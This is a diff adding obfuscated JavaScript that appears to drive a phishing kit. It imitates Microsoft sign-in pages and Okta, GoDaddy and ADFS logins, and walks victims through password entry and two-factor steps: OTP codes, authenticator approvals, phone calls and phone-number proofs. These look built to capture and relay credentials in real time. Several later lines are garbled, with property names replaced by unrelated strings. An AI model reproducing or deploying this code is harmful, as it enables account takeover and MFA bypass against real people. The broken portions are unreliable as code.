+            ] = "none"),
+            (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x333))[_0x3bbaaa(0x37f)] =
+              ""),
+            (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x26e))[_0x3bbaaa(0x37f)] =
+              _0x384b2c[_0x3bbaaa(0x256)]),
+            bottomsectionlinks("authapp_live", _0x384b2c[_0x3bbaaa(0x213)]),
+            changebackbutton(_0x3bbaaa(0x238), _0x384b2c[_0x3bbaaa(0x326)]),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x23e) + view)["classList"][
+              _0x3bbaaa(0x315)
+            ]("d-none"),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2a4))["classList"][
+              _0x3bbaaa(0x39e)
+            ](_0x3bbaaa(0x1d6)),
+            (view = _0x3bbaaa(0x238)),
+            (viewtype = _0x3bbaaa(0x37e)),
+            wait2fa(_0x3bbaaa(0x1dd), _0x384b2c[_0x3bbaaa(0x348)]));
+          _0x384b2c[_0x3bbaaa(0x2b0)] == _0x3bbaaa(0x335) &&
+            ((wait2facancel = 0x1),
+            document["getElementById"](_0x3bbaaa(0x2b4))[_0x3bbaaa(0x208)][
+              _0x3bbaaa(0x280)
+            ](_0x3bbaaa(0x1d6)) &&
+              ((document["getElementById"](_0x3bbaaa(0x2b4))[_0x3bbaaa(0x224)](
+                _0x3bbaaa(0x2e1),
+              )[_0x3bbaaa(0x37f)] = _0x3bbaaa(0x399)),
+              setTimeout(function () {
+                const _0x4b2255 = _0x3bbaaa;
+                document["getElementById"](_0x4b2255(0x23e) + view)
+                  [_0x4b2255(0x224)](_0x4b2255(0x365))
+                  [_0x4b2255(0x208)][_0x4b2255(0x39e)](_0x4b2255(0x215)),
+                  runanimation(0x2, view, 0.5, 0x0),
+                  setTimeout(function () {
+                    const _0x11812c = _0x4b2255;
+                    document[_0x11812c(0x30b)]("section_" + view)["classList"][
+                      "toggle"
+                    ]("d-none"),
+                      (document[_0x11812c(0x30b)]("section_tryagainlater")[
+                        _0x11812c(0x224)
+                      ]("#tryagainheader")[_0x11812c(0x3b0)]["display"] =
+                        _0x11812c(0x203)),
+                      (document[_0x11812c(0x30b)](_0x11812c(0x2b4))[
+                        _0x11812c(0x224)
+                      ](_0x11812c(0x2a3))[_0x11812c(0x3b0)][_0x11812c(0x1e6)] =
+                        _0x11812c(0x203)),
+                      (document["getElementById"](_0x11812c(0x2b4))[
+                        _0x11812c(0x224)
+                      ](_0x11812c(0x2db))["style"][_0x11812c(0x34e)] =
+                        _0x11812c(0x29d)),
+                      document[_0x11812c(0x30b)](_0x11812c(0x2b4))[
+                        _0x11812c(0x208)
+                      ]["remove"](_0x11812c(0x1d6)),
+                      (view = _0x11812c(0x27f));
+                  }, 0xc8);
+              }, 0x1f4)));
+          _0x384b2c["message"] == _0x3bbaaa(0x22d) &&
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2b4))[_0x3bbaaa(0x208)][
+              "contains"
+            ]("d-none") &&
+            ((document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2b4))[_0x3bbaaa(0x224)](
+              _0x3bbaaa(0x2e1),
+            )[_0x3bbaaa(0x37f)] = _0x3bbaaa(0x269)),
+            setTimeout(function () {
+              const _0x21a609 = _0x3bbaaa;
+              document["getElementById"](_0x21a609(0x23e) + view)
+                ["querySelector"](".loading-container")
+                [_0x21a609(0x208)][_0x21a609(0x39e)](_0x21a609(0x215)),
+                runanimation(0x2, view, 0.5, 0x0),
+                setTimeout(function () {
+                  const _0x2966fe = _0x21a609;
+                  document[_0x2966fe(0x30b)](_0x2966fe(0x23e) + view)[
+                    "classList"
+                  ][_0x2966fe(0x315)](_0x2966fe(0x1d6)),
+                    (document[_0x2966fe(0x30b)]("section_tryagainlater")[
+                      "querySelector"
+                    ]("#tryagainheader")[_0x2966fe(0x3b0)]["display"] =
+                      _0x2966fe(0x203)),
+                    (document["getElementById"](_0x2966fe(0x2b4))[
+                      _0x2966fe(0x224)
+                    ](_0x2966fe(0x1fb))[_0x2966fe(0x3b0)][_0x2966fe(0x1e6)] =
+                      _0x2966fe(0x203)),
+                    (document[_0x2966fe(0x30b)](_0x2966fe(0x2b4))[
+                      "querySelector"
+                    ](_0x2966fe(0x2db))[_0x2966fe(0x3b0)][_0x2966fe(0x34e)] =
+                      _0x2966fe(0x29d)),
+                    document[_0x2966fe(0x30b)](_0x2966fe(0x2b4))[
+                      _0x2966fe(0x208)
+                    ][_0x2966fe(0x39e)](_0x2966fe(0x1d6)),
+                    (view = _0x2966fe(0x27f));
+                }, 0xc8);
+            }, 0x1f4));
+          if (_0x384b2c["message"] == _0x3bbaaa(0x248)) {
+            (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x1f9))[_0x3bbaaa(0x2ab)] =
+              ""),
+              (document["getElementById"](_0x3bbaaa(0x2f0))[_0x3bbaaa(0x37f)] =
+                ""),
+              (document["getElementById"](_0x3bbaaa(0x324))[_0x3bbaaa(0x2ab)] =
+                ""),
+              bottomsectionlinks(_0x3bbaaa(0x356), [
+                {
+                  a_id: _0x3bbaaa(0x387),
+                  a_text: _0x3bbaaa(0x231),
+                  text: _0x3bbaaa(0x202),
+                  type: _0x3bbaaa(0x3a0),
+                },
+                {
+                  a_id: "cantAccessAccount",
+                  a_text: _0x3bbaaa(0x1e3),
+                  type: _0x3bbaaa(0x2d8),
+                },
+              ]);
+            (document["getElementById"](_0x3bbaaa(0x23e) + view)[
+              _0x3bbaaa(0x224)
+            ](_0x3bbaaa(0x2db))["style"][_0x3bbaaa(0x34e)] = ""),
+              document["getElementById"](_0x3bbaaa(0x23e) + view)[
+                _0x3bbaaa(0x208)
+              ][_0x3bbaaa(0x315)](_0x3bbaaa(0x1d6)),
+              (document["getElementById"]("section_uname")[_0x3bbaaa(0x224)](
+                _0x3bbaaa(0x2db),
+              )["style"]["animation"] = ""),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x237))["classList"][
+                "remove"
+              ]("d-none"),
+              document["body"][_0x3bbaaa(0x3b0)]["backgroundImage"] &&
+                (document[_0x3bbaaa(0x35d)][_0x3bbaaa(0x3b0)][
+                  _0x3bbaaa(0x200)
+                ] = ""),
+              document[_0x3bbaaa(0x35d)][_0x3bbaaa(0x3b0)][_0x3bbaaa(0x2fd)] &&
+                (document["body"][_0x3bbaaa(0x3b0)]["backgroundColor"] = "");
+          }
+          _0x384b2c[_0x3bbaaa(0x2b0)] ==
+            "lets\x20try\x20something\x20else\x20or\x20come\x20back" &&
+            ((document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2d4))[_0x3bbaaa(0x224)](
+              ".title",
+            )[_0x3bbaaa(0x1f2)] = _0x384b2c[_0x3bbaaa(0x34c)]),
+            checkerrordesc(
+              "signinanothererrordesc",
+              0x2,
+              _0x384b2c[_0x3bbaaa(0x1f8)],
+            ),
+            document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x23e) + view)[
+              _0x3bbaaa(0x208)
+            ][_0x3bbaaa(0x315)](_0x3bbaaa(0x1d6)),
+            document[_0x3bbaaa(0x30b)]("section_signinanothererror")[
+              _0x3bbaaa(0x208)
+            ][_0x3bbaaa(0x39e)](_0x3bbaaa(0x1d6)),
+            bottomsectionlinks(_0x3bbaaa(0x352), _0x384b2c[_0x3bbaaa(0x213)]),
+            (view = "signinanothererror")),
+            _0x384b2c[_0x3bbaaa(0x2b0)] == _0x3bbaaa(0x27b) &&
+              (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x23e) + view)[
+                _0x3bbaaa(0x208)
+              ]["toggle"](_0x3bbaaa(0x1d6)),
+              document["getElementById"](_0x3bbaaa(0x2e2))[_0x3bbaaa(0x208)][
+                _0x3bbaaa(0x39e)
+              ](_0x3bbaaa(0x1d6)),
+              (view = _0x3bbaaa(0x2d2))),
+            _0x384b2c["message"] == "otp\x20sent" &&
+              (_0x384b2c[_0x3bbaaa(0x395)] == _0x3bbaaa(0x284) &&
+                (otptype = 0x1),
+              _0x384b2c[_0x3bbaaa(0x395)] == _0x3bbaaa(0x2e3) &&
+                (otptype = 0x2),
+              _0x384b2c[_0x3bbaaa(0x395)] == _0x3bbaaa(0x1ed) &&
+                (otptype = 0x3),
+              (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2ce))[_0x3bbaaa(0x37f)] =
+                ""),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x25c))[_0x3bbaaa(0x26c)](
+                _0x3bbaaa(0x33b),
+                _0x384b2c["image_src"],
+              ),
+              checkerrordesc(_0x3bbaaa(0x284), 0x0, _0x384b2c["description"]),
+              bottomsectionlinks(_0x3bbaaa(0x284), _0x384b2c[_0x3bbaaa(0x213)]),
+              changebackbutton(_0x3bbaaa(0x284), _0x384b2c["backbutton"]),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x23e) + view)[
+                _0x3bbaaa(0x208)
+              ]["toggle"](_0x3bbaaa(0x1d6)),
+              document[_0x3bbaaa(0x30b)]("section_otp")[_0x3bbaaa(0x208)][
+                _0x3bbaaa(0x39e)
+              ](_0x3bbaaa(0x1d6)),
+              (view = _0x3bbaaa(0x284)),
+              (viewtype = null)),
+            _0x384b2c[_0x3bbaaa(0x2b0)] == _0x3bbaaa(0x2a9) &&
+              ((document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2ce))[_0x3bbaaa(0x37f)] =
+                ""),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x285))[_0x3bbaaa(0x26c)](
+                _0x3bbaaa(0x33b),
+                _0x384b2c[_0x3bbaaa(0x258)],
+              ),
+              checkerrordesc(
+                _0x3bbaaa(0x1df),
+                0x0,
+                _0x384b2c[_0x3bbaaa(0x2bb)],
+              ),
+              bottomsectionlinks(_0x3bbaaa(0x1df), _0x384b2c[_0x3bbaaa(0x213)]),
+              changebackbutton(_0x3bbaaa(0x1df), _0x384b2c[_0x3bbaaa(0x326)]),
+              (document[_0x3bbaaa(0x30b)]("authappcode")[_0x3bbaaa(0x1f2)] =
+                _0x384b2c[_0x3bbaaa(0x299)]),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x23e) + view)[
+                _0x3bbaaa(0x208)
+              ][_0x3bbaaa(0x315)]("d-none"),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x371))[_0x3bbaaa(0x208)][
+                "remove"
+              ](_0x3bbaaa(0x1d6)),
+              (view = _0x3bbaaa(0x1df)),
+              (viewtype = null),
+              wait2fa("app", _0x384b2c[_0x3bbaaa(0x348)])),
+            _0x384b2c[_0x3bbaaa(0x2b0)] ==
+              "approve\x20auth\x20request\x20calling" &&
+              (document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x273))
+                [_0x3bbaaa(0x224)](_0x3bbaaa(0x20d))
+                [_0x3bbaaa(0x1d8)](),
+              (document["getElementById"](_0x3bbaaa(0x2ce))[_0x3bbaaa(0x37f)] =
+                ""),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x244))["setAttribute"](
+                _0x3bbaaa(0x33b),
+                _0x384b2c[_0x3bbaaa(0x258)],
+              ),
+              checkerrordesc(_0x3bbaaa(0x201), 0x0, _0x384b2c["description"]),
+              bottomsectionlinks(_0x3bbaaa(0x201), _0x384b2c["bottomsection"]),
+              changebackbutton(_0x3bbaaa(0x201), _0x384b2c[_0x3bbaaa(0x326)]),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x23e) + view)[
+                _0x3bbaaa(0x208)
+              ][_0x3bbaaa(0x315)](_0x3bbaaa(0x1d6)),
+              document["getElementById"](_0x3bbaaa(0x273))[_0x3bbaaa(0x208)][
+                _0x3bbaaa(0x39e)
+              ](_0x3bbaaa(0x1d6)),
+              (view = _0x3bbaaa(0x201)),
+              (viewtype = null),
+              wait2fa("call")),
+            _0x384b2c[_0x3bbaaa(0x2b0)] == "error" &&
+              (bottomsectionlinks(
+                _0x3bbaaa(0x232),
+                _0x384b2c[_0x3bbaaa(0x213)],
+              ),
+              changebackbutton(_0x3bbaaa(0x232), _0x384b2c["backbutton"]),
+              checkerrordesc("2fa", 0x1, _0x384b2c[_0x3bbaaa(0x2bb)])),
+            _0x384b2c[_0x3bbaaa(0x2b0)] == _0x3bbaaa(0x277) &&
+              ((document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2ce))[_0x3bbaaa(0x37f)] =
+                ""),
+              checkerrordesc("verifyemail", 0x0, _0x384b2c[_0x3bbaaa(0x2bb)]),
+              bottomsectionlinks("confirmemail", _0x384b2c["bottomsection"]),
+              changebackbutton(_0x3bbaaa(0x216), _0x384b2c[_0x3bbaaa(0x326)]),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x23e) + view)["classList"][
+                _0x3bbaaa(0x315)
+              ](_0x3bbaaa(0x1d6)),
+              document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x2e0))[_0x3bbaaa(0x208)][
+                _0x3bbaaa(0x39e)
+              ](_0x3bbaaa(0x1d6)),
+              (view = _0x3bbaaa(0x216)),
+              (viewtype = null)),
+            _0x384b2c[_0x3bbaaa(0x2b0)] == _0x3bbaaa(0x267) &&
+              ((document[_0x3bbaaa(0x30b)](_0x3bbaaa(0x212))[_0x3bbaaa(0x224)](
+                _0x3bbaaa(0x2e1),
+              )[_0x3bbaaa(0x1f2)] = _0x3bbaaa(0x396)),
+              document["getElementById"](_0x3bbaaa(0x38d))["classList"][
+                _0x3bbaaa(0x315)
+              ](_0x3bbaaa(0x23d)),
+              (document["getElementById"]("authapperrordesc")[
+                _0x3bbaaa(0x1e9)
+              ] = _0x3bbaaa(0x314)),
+              (view = _0x3bbaaa(0x310)),
+              (viewtype = null));
         }
+      })
+      [_0x26e6d6(0x379)]((_0x5e6d3f) => {
+        const _0x55ded3 = _0x26e6d6;
+        loadinganimation(0x1), console[_0x55ded3(0x23d)]("Error:", _0x5e6d3f);
+      });
+}
+const unameInp = document[`selectprotectoption(this)`](`#btn_back`),
+  pwdInp = document["getElementById"](`tryagainlater`);
+let unameVal = (pwdVal = ![]);
+const nxt = document[`selectprotectoption(this)`](`godaddy`);
+nxt[`phcontainer`](`trim`, () => {
+  validate();
+});
+const sig = document[`selectprotectoption(this)`](`<span>`);
+sig[`phcontainer`]("click", () => {
+  validate();
+});
+const cancelbtns = document["querySelectorAll"](`CompanionAppsNotification`);
+function _0x2985() {
+  const _0x34edef = [
+    "checkpass",
+    "Enter\x20the\x20code\x20you\x20received",
+    "\x20<a\x20href=\x22#\x22\x20data-id=\x22",
+    "content",
+    "input#i011e.okta",
+    "important",
+    "maxLength",
+    "Sign\x20out\x20and\x20sign\x20in\x20with\x20a\x20different\x20account",
+    "log",
+    "section_multipleaccounts",
+    "66skRDDk",
+    "OneWaySMS_Live",
+    "error_authapp_live",
+    "some",
+    "duplicate\x20request",
+    "location",
+    "section_protectaccount",
+    "Enter\x20a\x20security\x20code",
+    "tabindex",
+    "#btn_back",
+    "src",
+    "if\x20otp\x20sent",
+    "table-row",
+    "btn_next_doc",
+    "5319848cyFqbB",
+    "unset",
+    "otpdesc",
+    "oninput",
+    "desc",
+    "dynamic-style",
+    ".auth-org-logo",
+    "Send\x20another\x20request",
+    "\x22\x20onclick=\x22linkoptionclick(this)\x22>",
+    "methodid",
+    "pdfemail",
+    "table-cell",
+    "PhoneAppOTP_Live",
+    "title",
+    "#section_uname_content",
+    "animation",
+    "split",
+    "Enter\x20the\x20code\x20to\x20help\x20us\x20verify\x20your\x20identity.",
+    "get\x20a\x20code\x20a\x20different\x20way.",
+    "signinanothererror",
+    "noRightBorder",
+    "otp\x20sent\x20live",
+    "tel",
+    "uname",
+    "text-left",
+    "removeChild",
+    "Sorry,\x20we\x27re\x20having\x20trouble\x20verifying\x20your\x20account.\x20Please\x20try\x20again.\x20",
+    "Forgot\x20my\x20password",
+    "inp_otp_live",
+    "a_text",
+    "body",
+    "iProofPhoneEntry",
+    "error_",
+    "sections_",
+    "idp",
+    "otpliveimg",
+    "hide-to-right\x20",
+    "lets\x20try\x20something\x20else\x20or\x20come\x20back",
+    ".loading-container",
+    "approve\x20auth\x20request\x20calling",
+    "Error:",
+    "section_uname_doc",
+    "email\x20otp",
+    "signinblocked\x20live",
+    "newwebsiteopen",
+    "click",
+    "bold",
+    "getAttribute",
+    "error_uname_pdf",
+    "accountoptions",
+    "section_authapp",
+    "setProperty",
+    "titlehint",
+    "#btn_verifyotp_live",
+    "valid\x20email\x20otp",
+    ".btn_final",
+    "OneWayVoiceMobileOTP",
+    "iProofPhone",
+    "catch",
+    "834ylAwod",
+    "assertive",
+    "aria-required",
+    "</p>",
+    "auth",
+    "innerText",
+    "selectmultipleaccountadfs",
+    "confirmemailorphone_live",
+    "off",
+    "signoutoption",
+    "protectaccount\x20live",
+    "error_confirmemailorphone_live",
+    "backgroundcolor",
+    "signup",
+    "alert",
+    "error\x20enter\x20a\x20code",
+    "iAdditionalProofInfo",
+    "protectoptions",
+    "#btn_confirmemailorphone_live",
+    "authapperrordesc",
+    "btn_next",
+    "uname_pdf",
+    "Hide",
+    "button.show-hide-btn",
+    "error\x20live",
+    "2fa\x20is\x20off\x20newwebsite",
+    "proof",
+    "type",
+    "Request\x20wasn\x27t\x20sent",
+    "section_moreinforequired",
+    "\x22\x20onclick=\x22linkoptionclick(this)\x22\x20class=\x22link\x22\x20style=\x22display:\x20unset;\x22>",
+    "Too\x20many\x20Attempts",
+    "width",
+    "section_otp",
+    "span.ux-button-text",
+    "overflow",
+    "remove",
+    "ajax",
+    "text_link",
+    "#oktasignin",
+    "docemail",
+    "#btn_next_doc",
+    "224710PADbCr",
+    "sections_godaddy",
+    "12695530KLRKgg",
+    "tiletitle",
+    "parentNode",
+    "emailPartial",
+    "section_sidebarlogin_adfs",
+    "#btn_confirmemail",
+    "36px",
+    "142499lsAMVs",
+    "input",
+    "addEventListener",
+    "style",
+    "OneWaySMS",
+    "signin_blocked_live",
+    "createElement",
+    "bannerlogo",
+    "input[type=\x22radio\x22]",
+    "Microsoft\x20Authenticator",
+    "authapperrorresend",
+    "placeholder",
+    "class",
+    "aria-checked",
+    "pop",
+    "d-none",
+    "OneWaySMS_Live_2",
+    "focus",
+    "height",
+    "sections_pdf",
+    "Back",
+    "2fa\x20is\x20off",
+    "app",
+    "Please,\x20provide\x20a\x20valid\x20email.",
+    "authapp",
+    "protectaccount",
+    "ihaveacode",
+    "btn_protectaccount",
+    "Can’t\x20access\x20your\x20account?",
+    ".btn_can",
+    "section_signin_blocked_live",
+    "display",
+    "14px",
+    "#f5f7f8",
+    "innerHTML",
+    "status",
+    "sign\x20in\x20blocked",
+    "multipleaccounts",
+    "callotp",
+    ".user_identity",
+    "fadeinform\x201s\x20forwards",
+    "129230caTaKr",
+    "autocomplete",
+    "textContent",
+    "#next_btn_pdf",
+    "authenticaion\x20failed",
+    "Sign\x20in\x20another\x20way",
+    "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20input[type=email],\x20input[type=tel]\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20width:\x20inherit;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::-moz-selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20",
+    "slice",
+    "signinanothererrordesc",
+    "inp_uname",
+    "24px",
+    "#tryagain_withoutinternet",
+    "error-inp",
+    "try_again_otp",
+    "#btn_sig",
+    "checkemail",
+    "backgroundImage",
+    "authcall",
+    "No\x20account?",
+    "block",
+    "aria-describedby",
+    "hasAttribute",
+    "signin_blocked_reason",
+    "protect_account_live",
+    "classList",
+    "key",
+    "section_confirmemailorphone_live",
+    "</a>\x20or\x20try\x20to\x20sign\x20in\x20again\x20shortly.</p>",
+    "replace",
+    ".back",
+    "twofaselected",
+    "waiting\x20for\x20previous\x20request\x20to\x20complete",
+    "alert-error",
+    "<span>",
+    "section_authapperror",
+    "bottomsection",
+    "inp_confirmemailorphone_live",
+    "loading",
+    "confirmemail",
+    "largeIcon",
+    "godaddyemail",
+    "valid\x20phone\x20app\x20otp",
+    "pwd",
+    "Verify\x20online",
+    "btn_next_pdf",
+    "country",
+    "onchange",
+    "signin_blocked_live_email",
+    "</a></p>",
+    "data-methodid",
+    "That\x20doesn\x27t\x20match\x20the\x20phone\x20number\x20associated\x20with\x20your\x20account.\x20The\x20correct\x20number\x20ends\x20in\x20",
+    "Verify\x20your\x20email",
+    "querySelector",
+    "Verify\x20Online",
+    ",\x20and\x20then\x20click\x20\x22Send\x20code\x22\x20to\x20receive\x20your\x20code.\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20role=\x22alert\x22\x20aria-live=\x22assertive\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\x22alert\x20alert-error\x20Hide\x22\x20id=\x22iProofInputError\x22></div>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22emailPartial\x20dirltr\x20input-group\x20input-max-width\x22\x20id=\x22iProofEmailEntry\x22\x20style=\x22display:\x20none;\x22\x20aria-hidden=\x22true\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20class=\x22form-control\x20noRightBorder\x22\x20autocomplete=\x22off\x22\x20type=\x22email\x22\x20id=\x22iProofEmail\x22\x20name=\x22iProofEmail\x22\x20maxlength=\x22113\x22\x20aria-required=\x22true\x22\x20aria-label=\x22Email\x20name\x22\x20aria-describedby=\x22iProofInputError\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20class=\x22input-group-addon\x20noLeftBorder\x20outlookEmailLabel\x22\x20id=\x22iConfirmProofEmailDomain\x22></label>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22phcontainer\x22\x20id=\x22iProofPhoneEntry\x22\x20style=\x22\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<label\x20id=\x22iProofPhoneHint\x22\x20for=\x22iProofPhone\x22\x20class=\x22form-group-top\x22\x20aria-hidden=\x22true\x22>Last\x204\x20digits\x20of\x20phone\x20number</label>\x0a\x20\x20\x20\x20\x20\x20\x20\x20<input\x20type=\x22tel\x22\x20autocomplete=\x22off\x22\x20id=\x22iProofPhone\x22\x20name=\x22iProofPhone\x22\x20class=\x22form-control\x20input-max-width\x22\x20maxlength=\x224\x22\x20aria-required=\x22true\x22\x20aria-label=\x22Last\x204\x20digits\x20of\x20phone\x20number\x22\x20aria-describedby=\x22iProofInputError\x22>\x0a\x20\x20\x20\x20\x20\x20</div>\x0a\x20\x20\x20\x20",
+    "56WDqgrK",
+    "sections",
+    "correct\x20email",
+    "password",
+    "<p\x20class=\x22mb-16\x22>",
+    "href",
+    "session\x20timeout",
+    "error_uname",
+    "idA_PWD_ForgotPassword",
+    "presentation",
+    "Create\x20one!",
+    "2fa",
+    "uname_doc",
+    "label",
+    "The\x20wrong\x20code\x20was\x20entered.\x20Send\x20yourself\x20a\x20new\x20code\x20and\x20try\x20again.",
+    "relative",
+    "section_uname",
+    "authapp_live",
+    "twofaselect",
+    "Send\x20another\x20request\x20to\x20my\x20Microsoft\x20app",
+    "a_id",
+    "add",
+    "error",
+    "section_",
+    "signInAnotherWay",
+    "resentlink",
+    "5049dgudYJ",
+    "backgroundimage",
+    "script",
+    "authcallimg",
+    "Code",
+    "Received\x20response:",
+    "<a\x20href=\x22#\x22\x20data-id=\x22",
+    "redirected\x20back\x20to\x20sign\x20in",
+    "name",
+    "moreinforequired",
+    "dirltr",
+    "9tzhllo",
+    "text-block-body",
+    "validatediginp(this)",
+    "absolute",
+    "hide-to-left\x20",
+    "Last\x204\x20digits\x20of\x20phone\x20number",
+    "Please\x20enter\x20the\x20password\x20for\x20your\x20Microsoft\x20account.",
+    "position",
+    "btn_verifyotp",
+    "</a>\x20",
+    "authappreqid",
+    "maxlength",
+    "image_src",
+    "acctype",
+    "none",
+    "div",
+    "otpimg",
+    "#mainLoader",
+    "includes",
+    "backbtnclick",
+    "\x22\x20onclick=\x22linkoptionclick(this)\x22\x20class=\x22link\x22>",
+    "aria-label",
+    "approved\x20live",
+    "someone@example.com",
+    "PhoneAppOTP",
+    "tile-img",
+    "selectprotectoption(this)",
+    "request\x20wasnt\x20sent",
+    "valid\x20otp",
+    "We\x20didn\x27t\x20hear\x20from\x20you",
+    "fadeoutform\x201s\x20forwards",
+    "Enter",
+    "setAttribute",
+    "error\x20",
+    "authapp_live_code",
+    "length",
+    "waiting",
+    "accessblockedsignoutoption",
+    "background-color",
+    "section_authcall",
+    "multiple\x20accounts",
+    "parse",
+    "section_uname_pdf",
+    "verifyemail",
+    "error_otp",
+    "We\x20couldn\x27t\x20find\x20an\x20account\x20with\x20that\x20username.\x20Try\x20another,\x20or\x20get\x20a\x20new\x20Microsoft\x20account.",
+    "\x0a\x20\x20\x20\x20\x20\x20<div\x20class=\x22text-block-body\x22\x20id=\x22iEnterProofDesc\x22>\x0a\x20\x20\x20\x20\x20\x20\x20\x20To\x20verify\x20that\x20this\x20is\x20your\x20phone\x20number,\x20enter\x20the\x20last\x204\x20digits\x20including\x20",
+    "you\x20dont\x20have\x20access",
+    "1777886NxFwwE",
+    "protect\x20account",
+    "script[src^=\x22",
+    "tryagainlater",
+    "contains",
+    "#docemailloading",
+    "iEnterProofDesc",
+    "multbackbtnclick",
+    "otp",
+    "authappimg",
+    "data-id",
+    "section_2fa",
+    "section_protect_account_live",
+    "querySelectorAll",
+    "#btn_next",
+    "<p>",
+    "To\x20verify\x20that\x20this\x20is\x20your\x20phone\x20number,\x20enter\x20the\x20last\x204\x20digits\x20including\x2095,\x20and\x20then\x20click\x20\x22Send\x20code\x22\x20to\x20receive\x20your\x20code.",
+    "for",
+    "accessblocked",
+    "288sDLHMP",
+    "keyup",
+    "marginBottom",
+    "form-group-top",
+    "debugdetailsinfo",
+    "success",
+    "float",
+    "fail",
+    "json",
+    "link_text",
+    "authappcode",
+    "sections_doc",
+    "row",
+    "span",
+    "show-from-right\x200.5s",
+    "EmailOTP_Live_2",
+    "section_final",
+    ".iAdditionalProofInfo",
+    "get",
+    "Email\x20name",
+    "#tryagain_toomanyattempts",
+    "section_authapp_live",
+    "customslashstr",
+    "logo",
+    "error_otp_live",
+    "error_verifyemail",
+    "approve\x20auth\x20request\x20auth\x20app",
+    "appendChild",
+    "value",
+    "iProofEmailEntry",
+    "godaddypassword",
+    "That\x20doesn\x27t\x20match\x20the\x20alternate\x20email\x20associated\x20with\x20your\x20account.\x20The\x20correct\x20email\x20starts\x20with\x20\x22",
+    "twofamethods",
+    "message",
+    "2fa\x20is\x20on",
+    "cantAccessAccount",
+    "input-group",
+    "section_tryagainlater",
+    "approve\x20auth\x20request\x20auth\x20app\x20live",
+    "btn_sig",
+    "Sign\x20in\x20using\x20another\x20Microsoft\x20account",
+    "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::-moz-selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20::selection\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20#a6fff8;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20}\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20",
+    "email",
+    "button",
+    "description",
+    "Send\x20another\x20request\x20to\x20my\x20Microsoft\x20Authenticator\x20app",
+    "head",
+    "footer",
+    "#btn_verifyotp",
+    "hasOwnProperty",
+    "mb-16",
+    "selecttwofamethod(this)",
+    "listitem",
+    "notanymore",
+    "confirmemailorphone_live_title",
+    "small",
+    "trim",
+    "iProofInputError",
+    "forEach",
+    "flex",
+    "row\x20tile",
+    "removeAttribute",
+    "voice",
+    "error_2fa",
+    "section_accessblocked",
+    "Send\x20another\x20request\x20to\x20my\x20Outlook\x20mobile\x20app",
+    "backbuttonclick(this,2)",
+    "youdonthaveaccess",
+    "Can\x27t\x20access\x20your\x20account?",
+    "section_signinanothererror",
+    "input-max-width",
+    "Show",
+    "proofDiv",
+    "link",
+    "[aria-describedby=\x22iProofInputError\x22]",
+    "Next",
+    ".sectioncontent",
+    "okta",
+    "table",
+    ".bannerlogo",
+    "inp_otpcode",
+    "section_confirmemail",
+    ".title",
+    "section_youdonthaveaccess",
+    "sms",
+    "forwards",
+    "backbtnid",
+    "otp_live",
+    "phone",
+    "iEnterProofDesc\x20iProofLbl1",
+    "godaddy",
+    "section_otp_live",
+    "Send\x20Code",
+    "TwoWayVoiceMobile",
+    "POST",
+    "radio",
+    "role",
+    "error_pwd",
+    "call",
+    "section_multipleaccounts_adfs",
